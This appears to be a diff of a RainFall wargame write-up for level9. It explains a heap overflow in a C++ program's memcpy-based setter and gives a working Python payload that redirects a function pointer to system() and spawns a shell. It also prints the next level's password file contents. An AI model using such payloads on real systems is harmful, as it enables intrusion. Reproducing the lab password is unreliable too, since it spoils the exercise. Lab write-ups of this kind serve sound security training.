@@ -1,4 +1,13 @@
-level9@RainFall:~$ ./level9 $(python -c "print 'AAAA\x60\x60\xd8\xb7'+'A'*100 + '\x10\xa0\x04\x08;/bin/sh'")
+In this level we have a C++ programm that defines a class with 2 properties one string (annotation) and one int
+it has a method setAnnonation that set the annotation of the object with a string passed as argument using memcpy
+
+the objects are allocated in the heap using new operator
+when we use the program we notice that it crashes when we pass more than 108 characters to memcpy
+using GDB we see that the crash is causes due to overriding the address of + operator of the class
+we then override it with the address of system function but not directly as tin the assembly code the we dereference twice to get the address of the function
+due to that we put the address of system in the buffer and we override the address of operator + with the address of the buffer
+
+~$ ./level9 $(python -c "print '\x60\x60\xd8\xb7'+'A'*104 + '\x0c\xa0\x04\x08;/bin/sh'")
 sh: 1: : not found
 $ cat /home/user/bonus0/.pass
 f3f0004b6f364cb5a4147e9ef827fa922a4861408845c26b6971ad770d906728
